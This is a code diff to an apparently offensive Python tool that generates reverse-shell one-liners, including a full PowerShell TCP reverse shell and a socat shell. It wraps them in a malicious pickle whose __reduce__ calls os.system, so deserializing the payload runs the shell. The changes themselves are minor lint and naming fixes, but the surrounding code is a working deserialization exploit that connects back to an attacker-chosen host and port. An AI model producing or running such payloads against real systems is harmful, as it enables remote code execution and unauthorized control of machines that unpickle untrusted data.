@@ -1,3 +1,4 @@
+#pylint: disable=line-too-long
 import pickle
 import os
 
@@ -26,11 +27,11 @@ rev_shells = {
 	"socat":
 		"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{}:{}",
 	"powershell":
-		"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""""
+		"""powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""""
 }
 
-def rev_shell(host, port, type):
-	return rev_shells[type].format(host, port)
+def rev_shell(host, port, typ):
+	return rev_shells[typ].format(host, port)
 
 class PickleRCE:
 	def __init__(self, cmd):
@@ -39,10 +40,11 @@ class PickleRCE:
 	def __reduce__(self):
 		return os.system, (self.cmd, )
 
-def pickle_rev_shell(host, port, type="python", protocol=None):
-	return pickle.dumps(PickleRCE(rev_shell(host, port, type)), protocol)
+def pickle_rev_shell(host, port, typ="python", protocol=None):
+	return pickle.dumps(PickleRCE(rev_shell(host, port, typ)), protocol)
 
 def main():
+	#pylint: disable=import-outside-toplevel
 	import argparse
 	parser = argparse.ArgumentParser()
 	parser.add_argument("host")
